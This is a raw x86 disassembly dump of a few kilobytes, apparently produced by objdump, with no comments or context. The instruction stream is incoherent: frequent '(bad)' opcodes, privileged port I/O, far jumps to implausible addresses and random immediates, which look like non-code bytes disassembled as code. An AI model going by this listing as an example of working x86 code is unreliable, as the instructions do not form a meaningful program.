  416fca:	in     eax,dx
  416fcb:	retf   0xeac5
  416fce:	cmc    
  416fcf:	add    ebx,eax
  416fd1:	in     eax,dx
  416fd2:	enter  0xffc3,0xfd
  416fd6:	sti    
  416fd7:	sar    ah,0xf7
  416fda:	loop   0x416fb0
  416fdc:	out    0x4,al
  416fde:	into   
  416fdf:	adc    ebx,esi
  416fe1:	add    DWORD PTR [edi-0x541c2d38],esp
  416fe7:	out    0xd5,eax
  416fe9:	mov    cl,0xf2
  416feb:	lock (bad) 
  416fed:	fsubr  st,st(2)
  416fef:	imul   ah
  416ff1:	aam    0xde
  416ff3:	loopne 0x416ff0
  416ff5:	lock add eax,0xe6fef3
  416ffb:	retf   
  416ffc:	out    dx,eax
  416ffd:	fiadd  WORD PTR [esi]
  416fff:	in     eax,0xef
  417001:	cld    
  417002:	in     al,0xb1
  417004:	(bad)  
  417005:	scas   al,BYTE PTR es:[edi]
  417006:	shl    esi,cl
  417008:	mov    dl,0xf2
  41700a:	out    0xe9,al
  41700c:	int3   
  41700d:	xlat   BYTE PTR ds:[ebx]
  41700e:	ror    ch,1
  417010:	jmp    0x417009
  417012:	leave  
  417013:	fiadd  DWORD PTR [ebx]
  417015:	(bad)  
  417016:	std    
  417017:	lds    edi,FWORD PTR [ecx-0x102224f6]
  41701d:	in     al,0xe4
  41701f:	loope  0x416fea
  417021:	or     dh,BYTE PTR [edx-0xd295a53]
  417027:	mov    ah,0xeb
  417029:	enter  0xe0f6,0xef
  41702d:	(bad)  
  41702e:	fucomp st(1)
  417030:	mov    ch,0xcd
  417032:	loopne 0x41702f
  417034:	mov    ecx,0xebde03ee
  417039:	out    0xfc,eax
  41703b:	loopne 0x41703a
  41703d:	jmp    0xf31f4011
  417042:	out    0xca,eax
  417044:	test   eax,0xcfecd3f0
  417049:	jmp    0xba2f252f
  41704e:	lds    edi,FWORD PTR [edi+0x7dc01fa]
  417054:	stc    
  417055:	shl    ah,1
  417057:	push   edx
  417059:	in     al,0xf9
  41705b:	fsub   st,st(2)
  41705d:	iret   
  41705e:	loope  0x41703e
  417060:	clc    
  417061:	retf   0xc6e0
  417064:	in     al,0xc7
  417066:	shl    cl,cl
  417068:	repnz in eax,0xc7
  41706b:	mov    edx,0xd1f5b5d2
  417070:	cli    
  417071:	mov    ebp,0xfe07cff3
  417076:	shr    ah,cl
  417078:	(bad)  
  417079:	xlat   BYTE PTR ds:[ebx]
  41707a:	or     ecx,ebx
  41707c:	or     ebx,ecx
  41707e:	out    dx,al
  41707f:	in     al,0xd9
  417081:	repz int 0xc8
  417084:	into   
  417085:	mov    dl,0xad
  417087:	call   0xba302859
  41708c:	retf   
  41708d:	icebp  
  41708e:	mov    ebx,0xf5c3efeb
  417093:	ret    0xf0b8
  417096:	(bad)  
  417098:	sar    edx,1
  41709a:	lock hlt 
  41709c:	jmp    0xe9e1:0xcfdceebc
  4170a3:	retf   
  4170a4:	mov    bl,0xe2
  4170a6:	ret    0xcbc9
  4170a9:	retf   
  4170aa:	out    0xb4,al
  4170ac:	out    0xf5,al
  4170ae:	(bad)  
  4170af:	leave  
  4170b0:	icebp  
  4170b1:	not    edi
  4170b3:	mov    dh,0xd6
  4170b5:	add    dl,al
  4170b7:	repz out 0xe7,al
  4170ba:	hlt    
  4170bb:	cmc    
  4170bc:	rcr    cl,0xe3
  4170bf:	in     eax,dx
  4170c0:	pop    es
  4170c1:	or     cl,cl
  4170c3:	in     al,dx
  4170c4:	fucomip st,st(5)
  4170c6:	cmc    
  4170c7:	out    dx,al
  4170c8:	ror    ecx,0xd8
  4170cb:	cmc    
  4170cc:	out    dx,eax
  4170cd:	mov    eax,0xd9edb4dd
  4170d2:	test   DWORD PTR [ebx],0xf6f9fdb9
  4170d8:	vpaddusb xmm4,xmm1,xmm6
  4170dc:	fnstsw ax
  4170de:	paddb  mm7,mm2
  4170e1:	clc    
  4170e2:	fxch   st(2)
  4170e4:	(bad)  
  4170e5:	out    0xaf,eax
  4170e7:	mov    ah,0xee
  4170e9:	xlat   BYTE PTR ds:[ebx]
  4170ea:	sti    
  4170eb:	shl    ch,0xd4
  4170ee:	out    dx,al
  4170ef:	stc    
  4170f0:	mov    esp,0xd2eeb8cd
  4170f5:	mov    al,0xfc
  4170f8:	repz stc 
  4170fa:	jmp    0xe2284def
  4170ff:	retf   
  417100:	or     ebx,esp
  417102:	lods   al,BYTE PTR ds:[esi]
  417103:	test   eax,0xb5c7cce2
  417108:	fucomi st,st(3)
  41710a:	enter  0xd0e6,0xcb
  41710e:	int3   
  41710f:	jmp    0xc1f93dd7
  417114:	fld    QWORD PTR [edx]
  417116:	aad    0xf1
  417118:	aad    0x2
  41711a:	out    0xbe,al
  41711c:	out    dx,eax
  41711d:	enter  0x7ee,0xfd
  417121:	add    al,0xcc
  417123:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417125:	mov    ebp,0xcaadb7d2
  41712a:	icebp  
  41712b:	int    0xed
  41712d:	mov    edx,0xf9f0f1ca
  417132:	(bad)  
  417134:	ret    0xdf07
  417137:	add    eax,0x4fec1eb
  41713c:	std    
  41713d:	add    ebp,ebx
  41713f:	in     eax,dx
  417140:	or     edx,ebp
  417142:	out    0xd0,al
  417144:	retf   
  417145:	call   0xfc246926
  41714a:	(bad)  
  41714b:	xlat   BYTE PTR ds:[ebx]
  41714c:	mov    ebx,0xe3e4eab0
  417151:	repz div BYTE PTR [esi-0x430d0b0e]
  417158:	out    0xde,al
  41715a:	(bad)  
  41715c:	iret   
  41715d:	in     eax,dx
  41715e:	or     ecx,DWORD PTR [ecx]
  417160:	cld    
  417161:	std    
  417162:	jecxz  0x417115
  417164:	jmp    0xb5bb:0xc2e8f5ed
  41716b:	rol    edi,1
  41716d:	cli    
  41716e:	fdivr  DWORD PTR [ebp-0x11440d41]
  417174:	add    DWORD PTR [edx],eax
  417176:	pop    es
  417177:	repz cmc 
  417179:	xlat   BYTE PTR ds:[ebx]
  41717a:	fcmovnb st,st(6)
  41717c:	retf   
  41717d:	(bad)  
  41717e:	or     eax,0xcb02fecb
  417183:	(bad)  
  417184:	lods   al,BYTE PTR ds:[esi]
  417185:	into   
  417186:	(bad)  
  417187:	enter  0xf5f3,0xb7
  41718b:	cmc    
  41718c:	stc    
  41718d:	mov    ch,0xed
  41718f:	jmp    0x417180
  417191:	rol    DWORD PTR [ebx],cl
  417193:	call   0xd11d448e
  417198:	ret    0xfeff
  41719b:	add    al,0x4
  41719d:	jmp    0xcb3a6d7e
  4171a2:	ret    
  4171a3:	shr    DWORD PTR [ecx-0x553150b],cl
  4171a9:	mov    dl,0xb1
  4171ab:	out    0xf5,al
  4171ad:	mov    ch,0xe5
  4171af:	repz hlt 
  4171b1:	std    
  4171b2:	enter  0xb803,0xda
  4171b6:	aam    0x6
  4171b8:	fcmovb st,st(6)
  4171ba:	lock aad 0xfb
  4171bd:	sti    
  4171be:	(bad)  
  4171bf:	cld    
  4171c0:	out    dx,eax
  4171c1:	jmp    0x4171b5
  4171c3:	mov    edi,0xe6f1e8c3
  4171c8:	lock div BYTE PTR [edi-0x34361926]
  4171cf:	retf   0xf2d4
  4171d2:	loope  0x4171c4
  4171d4:	std    
  4171d5:	out    dx,al
  4171d6:	xlat   BYTE PTR ds:[ebx]
  4171d7:	loope  0x4171dc
  4171d9:	dec    DWORD PTR [ebx]
  4171db:	leave  
  4171dc:	aad    0xe8
  4171de:	int    0xd8
  4171e0:	push   cs
  4171e1:	ror    eax,cl
  4171e3:	xlat   BYTE PTR ds:[ebx]
  4171e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e5:	shl    edi,1
  4171e7:	jmp    0xb6f0:0xd9b0c9ad
  4171ee:	retf   0xcacd
  4171f1:	fcmovne st,st(5)
  4171f3:	not    ebx
  4171f5:	loop   0x4171f7
  4171f7:	xlat   BYTE PTR ds:[ebx]
  4171f8:	(bad)  
  4171f9:	clc    
  4171fa:	mul    eax
  4171fc:	loop   0x4171f8
  4171fe:	fmul   st(7),st
  417200:	fild   WORD PTR [ecx]
  417202:	repnz shr eax,cl
  417205:	fst    st(2)
  417207:	fmul   st(2),st
  417209:	in     eax,0xe7
  41720b:	call   0xb7016aeb
  417210:	xlat   BYTE PTR ds:[ebx]
  417211:	int    0xde
  417213:	inc    DWORD PTR [edx]
  417215:	mov    esp,0xc5e2f6fe
  41721a:	clc    
  41721b:	jmp    0xc71b7000
  417220:	leave  
  417221:	fmul   st,st(5)
  417223:	mov    bl,0xd2
  417225:	mov    al,0xc8
  417227:	mov    dl,0xe2
  417229:	stc    
  41722a:	in     eax,dx
  41722b:	in     eax,0xb4
  41722d:	(bad)  
  41722e:	mov    ebx,0xf5def6c8
  417233:	rol    eax,cl
  417235:	shl    edx,cl
  417237:	pop    es
  417238:	not    edi
  41723a:	or     ecx,ecx
  41723c:	out    0xe4,eax
  41723e:	(bad)  
  41723f:	hlt    
  417240:	out    dx,al
  417241:	in     eax,dx
  417242:	mov    bl,0xa9
  417244:	ret    
  417245:	shl    cl,cl
  417247:	mov    al,0xe3
  417249:	jmp    0xd7e9:0xf4d7c6ca
  417250:	jecxz  0x417247
  417252:	fucomp st(4)
  417254:	rcr    ch,0xf8
  417257:	add    edi,ebx
  417259:	add    ah,al
  41725b:	pop    es
  41725c:	fmul   DWORD PTR [ebx]
  41725e:	leave  
  41725f:	jmp    0xbe356652
  417264:	mov    ebp,0xb3d0eaf2
  417269:	mov    al,0xd7
  41726b:	vpmaxub ymm6,ymm2,YMMWORD PTR [ecx+ebp*8-0x2620010a]
  417274:	int3   
  417275:	fcomi  st,st(6)
  417277:	stc    
  417278:	rcr    bl,1
  41727a:	out    0xe5,eax
  41727c:	(bad)  
  41727d:	fadd   QWORD PTR [edi]
  41727f:	clc    
  417280:	cli    
  417281:	or     eax,0xf6eca8d3
  417286:	in     eax,dx
  417287:	iret   
  417288:	loop   0x417274
  41728a:	mov    ch,0xb7
  41728c:	(bad)  
  41728d:	ror    ah,cl
  41728f:	jmp    0x417282
  417291:	mov    esp,0xe7c2dd
  417296:	fdiv   st(2),st
  417298:	shl    al,0xdc
  41729b:	or     edx,edi
  41729d:	enter  0xe104,0xc5
  4172a1:	bswap  eax
  4172a3:	rol    dl,cl
  4172a5:	repnz (bad) 
  4172a7:	leave  
  4172a8:	sti    
  4172a9:	loop   0x417266
  4172ab:	int    0xe9
  4172ad:	clc    
  4172ae:	leave  
  4172af:	enter  0xf1bc,0xb7
  4172b3:	mov    esp,0xe7d9b8e6
  4172b8:	aad    0x6
  4172ba:	mul    cl
  4172bc:	clc    
  4172bd:	sti    
  4172be:	aam    0xfc
  4172c0:	loopne 0x41728d
  4172c2:	into   
  4172c3:	out    0xbd,al
  4172c5:	out    dx,al
  4172c6:	loope  0x417296
  4172c8:	vshufps ymm6,ymm1,YMMWORD PTR [edi-0x2a451947],0xd0
  4172d1:	std    
  4172d2:	jmp    0xfb1c60b4
  4172d7:	add    al,BYTE PTR [esi]
  4172d9:	shr    cl,0xd6
  4172dc:	out    0xf6,al
  4172de:	jmp    0x4172a9
  4172e0:	(bad)  
  4172e2:	shl    eax,cl
  4172e4:	icebp  
  4172e5:	out    0xf3,al
  4172e7:	in     eax,dx
  4172e8:	int3   
  4172e9:	repnz mov cl,0xd4
  4172ec:	int3   
  4172ed:	in     eax,dx
  4172ee:	mov    ecx,0xd8b8fffa
  4172f3:	ret    0xd0f5
  4172f6:	add    al,0xd8
  4172f8:	mov    ebp,0xe20fc4e4
  4172fd:	cli    
  4172fe:	cmc    
  4172ff:	add    DWORD PTR [edx],ecx
  417301:	loop   0x4172dc
  417303:	mov    cl,0xf7
  417305:	(bad)
  417308:	retf   
  417309:	mov    dh,0xb7
  41730b:	shl    DWORD PTR [ebp+esi*4-0x15004626],1
  417312:	hlt    
  417313:	cmc    
  417314:	fbstp  TBYTE PTR [ecx+eax*8+0x3bcb9c7]
  41731b:	out    dx,eax
  41731c:	out    0xce,al
  41731e:	or     al,ch
  417320:	(bad)  
  417321:	fcomip st,st(0)
  417323:	mov    dl,0xea
  417325:	loopne 0x41730e
  417327:	jmp    0xbbf128fb
  41732c:	clc    
  41732d:	mov    ah,0xbd
  41732f:	in     al,0xee
  417331:	cli    
  417332:	(bad)  
  417333:	mov    ebp,0x1c102ce
  417338:	(bad)  
  417339:	retf   
  41733a:	hlt    
  41733b:	bswap  ecx
  41733d:	clc    
  41733e:	retf   0xfbfc
  417341:	push   cs
  417342:	jmp    0xbd313d0c
  417347:	int    0xc1
  417349:	mov    ch,0xfb
  41734b:	mov    al,0xca
  41734d:	shl    bh,1
  41734f:	call   0xf32e6253
  417354:	std    
  417355:	ret    0xfcd7
  417358:	stc    
  417359:	(bad)  
  41735a:	cli    
  41735b:	call   0xc5264e43
  417360:	add    al,0xe0
  417362:	mov    edi,0xacb1b7f3
  417367:	icebp  
  417368:	out    0xea,eax
  41736a:	in     eax,0xcf
  41736c:	mov    ebx,0xc9faf1f9
  417371:	int    0xda
  417373:	(bad)  
  417374:	out    0xd0,al
  417376:	(bad)  
  417377:	(bad)  
  417378:	lock fiadd WORD PTR [ebx]
  41737b:	in     al,0xdf
  41737d:	(bad)  
  41737f:	out    0xdc,al
  417381:	or     bl,bh
  417383:	mov    esp,0xcac7afc0
  417388:	in     al,0xb0
  41738a:	leave  
  41738b:	jmp    0xbfb4:0xcad3cde9
  417392:	mov    edx,0xbd07f8da
  417397:	in     al,dx
  417398:	fdivr  st,st(6)
  41739a:	aam    0xfa
  41739c:	cld    
  41739d:	jmp    0xa0c40aa
  4173a2:	enter  0xede7,0xf7
  4173a6:	(bad)  
  4173a7:	out    0xf2,eax
  4173a9:	mov    cl,0xef
  4173ab:	vpslld xmm6,xmm5,XMMWORD PTR [ebp-0x242a1d26]
  4173b3:	stc    
  4173b4:	(bad)  
  4173b6:	test   DWORD PTR [edi],0xc5f1e7ff
  4173bc:	(bad)  
  4173be:	add    esi,ebp
  4173c0:	add    ebp,ebx
  4173c2:	int    0xe4
  4173c4:	mov    bh,0xf7
  4173c6:	rcr    esp,cl
  4173c8:	(bad)  
  4173c9:	jmp    0x41738f
  4173cb:	cmc    
  4173cc:	mov    cl,0xf1
  4173ce:	mov    edx,0xcdf2b5
  4173d3:	fsubr  st(1),st
  4173d5:	mov    eax,0x2dcf9e6
  4173da:	cld    
  4173db:	loop   0x4173c2
  4173dd:	retf   
  4173de:	ud0    edi,esi
  4173e1:	add    al,0xbe
  4173e3:	icebp  
  4173e4:	jmp    0xb5ea:0xe2e1cacf
  4173eb:	lock (bad) 
  4173ee:	rcl    al,1
  4173f0:	cli    
  4173f1:	mov    al,0xf6
  4173f3:	cld    
  4173f4:	iret   
  4173f5:	into   
  4173f6:	(bad)  
  4173f7:	mov    ebp,0xf00bffd9
  4173fc:	in     al,0x4
  4173fe:	add    eax,0xc3c9dd0d
  417403:	xlat   BYTE PTR ds:[ebx]
  417404:	in     eax,0xd3
  417406:	xlat   BYTE PTR ds:[ebx]
  417407:	(bad)  
  417408:	lods   al,BYTE PTR ds:[esi]
  417409:	fcomi  st,st(0)
  41740b:	repz cmc 
  41740d:	(bad)  
  41740e:	aad    0xe3
  417410:	mov    esi,0xcfe9ef
  417415:	mov    ebp,0xe5f0e1c0
  41741a:	fucompp 
  41741c:	out    dx,eax
  41741d:	retf   0xcd06
  417420:	leave  
  417421:	jecxz  0x4173fb
  417423:	out    dx,al
  417424:	out    0xae,eax
  417426:	mov    cl,0xe7
  417428:	enter  0xc0c7,0xd7
  41742c:	mov    eax,0xbad9e9c6
  417431:	shr    edi,cl
  417433:	inc    DWORD PTR [eax]
  417435:	in     eax,0xe1
  417437:	in     al,0xe0
  417439:	fcomip st,st(4)
  41743b:	in     eax,0xc4
  41743d:	loopne 0x417406
  41743f:	(bad)  
  417441:	fsubr  st(1),st
  417443:	icebp  
  417444:	(bad)  
  417445:	scas   eax,DWORD PTR es:[edi]
  417446:	int3   
  417447:	in     eax,dx
  417448:	loope  0x4173fc
  41744a:	mov    bh,0xb2
  41744c:	call   eax
  41744e:	fistp  QWORD PTR [esi-0x1332321d]
  417454:	ret    
  417455:	add    ebx,edi
  417457:	add    eax,ebx
  417459:	(bad)  
  41745a:	sti    
  41745b:	fmul   st(7),st
  41745d:	stc    
  41745e:	clc    
  41745f:	jmp    0xb1275d70
  417464:	shr    BYTE PTR [edx+esi*8-0x28303b17],cl
  41746b:	jmp    0xe91e6f5c
  417470:	hlt    
  417471:	(bad)  
  417473:	fcom   st(3)
  417475:	cld    
  417476:	add    eax,0xfae6c6f8
  41747b:	lar    edi,bx
  41747e:	add    al,0xe0
  417480:	pop    es
  417481:	add    ebx,edx
  417483:	scas   al,BYTE PTR es:[edi]
  417484:	enter  0xddef,0xea
  417488:	loope  0x41746e
  41748a:	mov    al,0xdb
  41748c:	sti    
  41748d:	hlt    
  41748e:	(bad)  
  41748f:	repz aam 0xee
  417492:	shr    esi,1
  417494:	into   
  417495:	repz repz shl bl,cl
  417499:	ret    
  41749a:	shl    edx,0xf9
  41749d:	loop   0x417473
  41749f:	in     eax,dx
  4174a0:	add    al,0xc8
  4174a2:	jmp    0x417468
  4174a4:	imul   ah
  4174a6:	mov    bl,0xf1
  4174a8:	rcl    dh,0xc7
  4174ab:	jmp    0x4174a6
  4174ad:	f2xm1  
  4174af:	xlat   BYTE PTR ds:[ebx]
  4174b0:	(bad)  
  4174b1:	shl    bl,cl
  4174b3:	shr    edi,0xd8
  4174b6:	ror    ah,cl
  4174b8:	fcomi  st,st(2)
  4174ba:	rol    DWORD PTR [edi],0xfd
  4174bd:	add    BYTE PTR [eax],cl
  4174bf:	loop   0x417489
  4174c1:	in     al,dx
  4174c2:	repnz mov eax,0xc5afcbbf
  4174c8:	enter  0xc8ac,0xf0
  4174cc:	mov    dh,0xcb
  4174ce:	sar    DWORD PTR [edx-0x37ff2401],1
  4174d4:	mov    ecx,0xc6f9dae1
  4174d9:	(bad)
  4174dc:	leave  
  4174dd:	rol    dh,0xf4
  4174e0:	add    eax,0xe9eaec07
  4174e5:	jmp    0x4174db
  4174e7:	in     al,0xb2
  4174e9:	into   
  4174ea:	aad    0xdb
  4174ec:	jmp    0x4174c0
  4174ee:	sti    
  4174ef:	mov    esp,0xdbf5c9c3
  4174f4:	fld    QWORD PTR [edi]
  4174f6:	stc    
  4174f7:	push   es
  4174f8:	hlt    
  4174f9:	stc    
  4174fa:	mov    edi,0xe9e1ef0a
  4174ff:	retf   0x3e5
  417502:	fsubrp st(6),st
  417504:	repnz out dx,eax
  417506:	out    0xdb,al
  417508:	ret    
  417509:	cmc    
  41750a:	shr    ebx,1
  41750c:	hlt    
  41750d:	(bad)  
  41750f:	ror    dh,cl
  417511:	in     eax,dx
  417512:	sti    
  417513:	shl    al,0xfc
  417516:	rcr    eax,1
  417518:	push   es
  417519:	out    0xdb,eax
  41751b:	std    
  41751c:	enter  0xcdf4,0xff
  417520:	fcmovu st,st(0)
  417522:	into   
  417523:	stos   BYTE PTR es:[edi],al
  417524:	(bad)  
  417526:	mov    dl,0xbc
  417528:	(bad)  
  417529:	in     eax,0xcf
  41752b:	mov    ah,0xc5
  41752d:	not    esp
  41752f:	(bad)  
  417530:	(bad)  
  417532:	into   
  417533:	in     eax,dx
  417534:	shl    BYTE PTR [esp+esi*8+0x4f8d5f5],0xd7
  41753c:	in     eax,0xb
  41753e:	(bad)  
  41753f:	iret   
  417540:	(bad)
  417543:	out    0xd6,al
  417545:	imul   BYTE PTR [ecx+edx*8-0x80d4f15]
  41754c:	fcmovbe st,st(1)
  41754e:	not    eax
  417550:	(bad)  
  417552:	mov    edi,0xeddfbff5
  417557:	int3   
  417558:	fucom  st(5)
  41755a:	sar    bl,0xfc
  41755d:	(bad)  
  41755e:	out    dx,al
  41755f:	ret    0xdc08
  417562:	test   eax,0xd4e3efc4
  417567:	shl    dh,1
  417569:	fcmovne st,st(4)
  41756b:	call   0xf1107368
  417570:	cli    
  417571:	jecxz  0x41756f
  417573:	loope  0x41755b
  417575:	ret    
  417576:	add    eax,0xeb06c4f7
  41757b:	add    al,al
  41757d:	fisttp QWORD PTR [edi]
  41757f:	(bad)  
  417582:	int    0xdc
  417584:	out    dx,al
  417585:	loop   0x417550
  417587:	idiv   ebx
  417589:	int3   
  41758a:	out    dx,al
  41758b:	int3   
  41758c:	(bad)  
  41758d:	lock mov edi,0xf7b4e8db
  417593:	enter  0xd3e3,0xd8
  417597:	idiv   edx
  417599:	hlt    
  41759a:	(bad)  
  41759c:	enter  0xe1f5,0xe3
  4175a0:	fcmovne st,st(5)
  4175a2:	fnstcw WORD PTR [edi+eiz*8-0x30141911]
  4175a9:	in     eax,0xc8
  4175ab:	push   edi
  4175ad:	(bad)  
  4175af:	in     al,dx
  4175b0:	aam    0xec
  4175b2:	(bad)  
  4175b3:	loope  0x417585
  4175b5:	add    al,BYTE PTR [eax]
  4175b7:	mov    esi,0xd409d7e2
  4175bc:	aad    0xe7
  4175be:	sti    
  4175bf:	retf   
  4175c0:	in     eax,dx
  4175c1:	repz mov ecx,0xbde3a5cd
  4175c7:	shl    DWORD PTR [esi+edx*8-0x45044905],0xc5
  4175cf:	sar    DWORD PTR [edx+ecx*8-0x251d1e0e],1
  4175d6:	out    0xf7,al
  4175d8:	cli    
  4175d9:	aam    0xd4
  4175db:	push   es
  4175dc:	fxch   st(3)
  4175de:	add    esi,ebp
  4175e0:	dec    BYTE PTR [eax]
  4175e2:	repnz faddp st(3),st
  4175e5:	repz mov edi,0xb9e9dbad
  4175ec:	dec    eax
  4175ee:	out    dx,al
  4175ef:	mov    ebx,0xf6c1d3d9
  4175f4:	(bad)  
  4175f5:	clc    
  4175f6:	out    0xc0,al
  4175f8:	(bad)  
  4175fa:	fmul   QWORD PTR [edx]
  4175fc:	(bad)  
  4175fd:	jmp    0x4175e9
  4175ff:	fdivp  st(6),st
  417601:	cli    
  417602:	ret    0xd2ce
  417605:	lods   eax,DWORD PTR ds:[esi]
  417606:	int    0xdc
  417608:	(bad)  
  417609:	leave  
  41760a:	fcomp  st(7)
  41760c:	retf   0xd3b6
  41760f:	(bad)  
  417611:	add    ecx,edi
  417613:	mov    eax,0xbeccfbbc
  417618:	retf   
  417619:	ret    0xc9f8
  41761c:	or     cl,ch
  41761e:	add    eax,0xeec9e6ec
  417623:	retf   
  417624:	shl    cl,cl
  417626:	jmp    0xe5f5:0xf9ccedc2
  41762d:	shr    bh,cl
  41762f:	repz shl al,cl
  417632:	mov    esp,0xbcece3ce
  417637:	rol    BYTE PTR [eax],0xfa
  41763a:	call   0xc4098613
  41763f:	leave  
  417640:	loopne 0x41761e
  417642:	fadd   st(2),st
  417644:	mov    bl,0xea
  417646:	icebp  
  417647:	iret   
  417648:	in     al,0xf5
  41764a:	hlt    
  41764b:	jmp    0xe1df:0xd0eff2c9
  417652:	in     al,dx
  417653:	add    ecx,esp
  417655:	neg    ebp
  417657:	loope  0x417616
  417659:	in     al,0x8
  41765b:	xlat   BYTE PTR ds:[ebx]
  41765c:	cmc    
  41765d:	aam    0xa
  41765f:	or     al,ah
  417661:	out    0xd3,eax
  417663:	lods   eax,DWORD PTR ds:[esi]
  417664:	jmp    0x417655
  417666:	retf   0xc5d3
  417669:	loope  0x417666
  41766b:	fcmove st,st(6)
  41766d:	clc    
  41766e:	mov    dh,0xd1
  417670:	fsubrp st(3),st
  417672:	add    dh,al
  417674:	fcomi  st,st(5)
  417676:	mov    ebx,0xd4b8d0ec
  41767b:	out    dx,eax
  41767c:	sar    ch,0xcf
  41767f:	add    eax,ebp
  417681:	stc    
  417682:	shr    esi,cl
  417684:	enter  0xf0ae,0xcc
  417688:	loope  0x417632
  41768a:	div    ch
  41768c:	in     eax,0xf7
  41768e:	test   ah,0xdb
  417691:	mov    ebp,0xdabed8dd
  417696:	(bad)
  417699:	out    0xbf,al
  41769b:	add    bl,cl
  41769d:	out    0xd5,eax
  41769f:	out    0xd8,al
  4176a1:	(bad)  
  4176a2:	scas   eax,DWORD PTR es:[edi]
  4176a3:	lods   eax,DWORD PTR ds:[esi]
  4176a4:	shl    BYTE PTR [edi+esi*8-0x3a39154b],cl
  4176ab:	mov    ebx,0xb4c5d3d9
  4176b0:	mov    eax,0xbddae8f9
  4176b5:	fdivr  st(6),st
  4176b7:	rcl    dl,cl
  4176b9:	std    
  4176ba:	(bad)  
  4176bb:	fld    QWORD PTR [ecx]
  4176bd:	fsub   st,st(1)
  4176bf:	out    0xcf,eax
  4176c1:	in     al,dx
  4176c2:	scas   al,BYTE PTR es:[edi]
  4176c3:	(bad)  
  4176c4:	(bad)  
  4176c5:	lods   eax,DWORD PTR ds:[esi]
  4176c6:	mov    dl,0xd7
  4176c8:	mov    ebx,0xf3b1b3c5
  4176cd:	int3   
  4176ce:	iret   
  4176cf:	mov    ebp,0xe3f9f5d4
  4176d4:	fsubp  st(4),st
  4176d6:	add    ecx,eax
  4176d8:	rol    BYTE PTR [edx],0xe3
  4176db:	std    
  4176dc:	add    esi,edi
  4176de:	inc    ebp
  4176e0:	loope  0x4176c1
  4176e2:	out    dx,al
  4176e3:	iret   
  4176e4:	mov    bl,0xcf
  4176e6:	lods   eax,DWORD PTR ds:[esi]
  4176e7:	jmp    0x4176b8
  4176e9:	test   al,0xe7
  4176eb:	jmp    0xfcbc:0xccfdf6d2
  4176f2:	mov    edi,0xed05b8dc
  4176f7:	jecxz  0x4176d3
  4176f9:	cli    
  4176fa:	add    eax,0xc3e7c706
  4176ff:	out    0xe7,al
  417701:	repnz mov edi,0xafe3f1c1
  417707:	(bad)  
  417708:	shl    ecx,cl
  41770a:	loope  0x417706
  41770c:	in     eax,0xfb
  41770e:	mov    edx,0xfad8fff3
  417713:	(bad)  
  417715:	mov    esp,0xf7e4ebd4
  41771a:	fcomi  st,st(4)
  41771c:	shl    bl,0xd9
  41771f:	or     eax,0xe3c5eecb
  417724:	leave  
  417725:	(bad)  
  417726:	(bad)  
  417727:	mov    bh,0xec
  417729:	cmc    
  41772a:	(bad)  
  41772b:	loopne 0x417724
  41772d:	int3   
  41772e:	leave  
  41772f:	lock (bad) 
  417732:	cld    
  417733:	sar    BYTE PTR [eax-0x1b011afb],cl
  417739:	in     eax,0xc5
  41773b:	fcmovnu st,st(3)
  41773d:	dec    DWORD PTR [edx]
  41773f:	fcmove st,st(6)
  417741:	in     al,dx
  417742:	lock rcl dh,cl
  417745:	in     eax,dx
  417746:	repz jmp 0x41772c
  417749:	out    dx,al
  41774a:	cmc    
  41774b:	out    0xc8,eax
  41774d:	(bad)  
  41774e:	mov    edi,0xdeb9e3cc
  417753:	iret   
  417754:	mov    esp,0xd2baf9f3
  417759:	test   BYTE PTR [eax],0xc4
  41775c:	aam    0xce
  41775e:	ud2    
  417760:	(bad)  
  417761:	in     al,dx
  417762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417763:	test   eax,0xefeee6ca
  417768:	(bad)  
  417769:	icebp  
  41776a:	lock mov dh,0xf9
  41776d:	mov    eax,0xefeff8f5
  417772:	loopne 0x417773
  417774:	fincstp 
  417776:	loopne 0x417779
  417778:	inc    cl
  41777a:	ffree  st(4)
  41777c:	(bad)  
  41777e:	push   cs
  41777f:	in     al,dx
  417780:	out    dx,al
  417781:	fucomip st,st(5)
  417783:	mov    bl,0xea
  417785:	faddp  st(1),st
  417787:	aam    0xca
  417789:	mov    ah,0xc8
  41778b:	out    dx,al
  41778c:	into   
  41778d:	out    0xba,al
  41778f:	not    eax
  417791:	mov    ebx,0xd8dcbffa
  417796:	jecxz  0x41778c
  417798:	mov    ecx,0xf6cbebd8
  41779d:	into   
  41779e:	int    0xea
  4177a0:	dec    ebx
  4177a2:	out    dx,eax
  4177a3:	jmp    0x417767
  4177a5:	shl    bl,cl
  4177a7:	in     eax,dx
  4177a8:	out    0xd7,eax
  4177aa:	shl    DWORD PTR [edx-0xf49220b],1
  4177b0:	repz enter 0xd1db,0xbf
  4177b5:	mov    eax,0xfccbddf2
  4177ba:	add    esi,edi
  4177bc:	(bad)  
  4177bd:	jmp    0x4177a4
  4177bf:	add    al,0xf
  4177c1:	pop    es
  4177c2:	out    dx,al
  4177c3:	repz mov al,0xe7
  4177c6:	jecxz  0x417790
  4177c8:	shl    DWORD PTR [edi-0x21250c11],1
  4177ce:	cli    
  4177cf:	mov    ah,0xbf
  4177d1:	idiv   ch
  4177d3:	in     eax,dx
  4177d4:	clc    
  4177d5:	clc    
  4177d6:	fdiv   st(6),st
  4177d8:	fsubr  st(7),st
  4177da:	out    0xf7,eax
  4177dc:	loope  0x4177a3
  4177de:	in     eax,0xcf
  4177e0:	in     eax,dx
  4177e1:	out    0xc3,eax
  4177e3:	loop   0x4177d5
  4177e5:	int3   
  4177e6:	scas   eax,DWORD PTR es:[edi]
  4177e7:	vpsubusw xmm4,xmm3,xmm5
  4177eb:	(bad)  
  4177ec:	out    dx,eax
  4177ed:	std    
  4177ee:	mov    ebx,0xecc2ddf1
  4177f3:	fdivp  st(5),st
  4177f5:	clc    
  4177f6:	add    esi,ecx
  4177f8:	rcl    bh,1
  4177fa:	add    bh,bh
  4177fc:	sti    
  4177fd:	sti    
  4177fe:	ficom  DWORD PTR [ebx]
  417800:	cli    
  417801:	int3   
  417802:	shl    edi,1
  417804:	repnz lock mov dl,0xea
  417808:	shl    edx,cl
  41780a:	loopne 0x4177fb
  41780c:	fcmove st,st(7)
  41780e:	(bad)  
  417810:	hlt    
  417811:	rcl    edi,1
  417813:	mov    edx,0x6fdb8bd
  417818:	in     eax,0xdf
  41781a:	out    0x7,eax
  41781c:	add    edx,ebp
  41781e:	push   es
  41781f:	or     dh,cl
  417821:	inc    bl
  417823:	out    dx,al
  417824:	mov    al,0xcf
  417826:	icebp  
